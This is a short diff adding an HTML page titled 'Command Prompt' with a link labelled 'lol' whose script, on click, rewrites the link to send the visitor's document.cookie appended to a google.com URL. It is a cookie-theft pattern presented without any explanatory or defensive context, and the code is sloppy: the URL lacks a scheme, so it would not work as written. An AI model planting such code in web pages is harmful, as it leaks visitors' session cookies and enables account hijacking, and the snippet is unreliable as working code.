@@ -1,0 +1,20 @@
+<html>
+  <head> <title >Command Prompt </title>
+	<script src="queries\jquery.js"></script>
+	<script>
+
+		// Ur javascript code here
+
+	</script >
+  </head>
+  <body>
+  <a id="ans" href="javascript:on()">
+	<script >
+		function on()
+		{
+			$("#ans")[0].href="www.google.com/action="+document.cookie;
+		}
+	</script>lol
+  </a>
+  </body>
+</html>
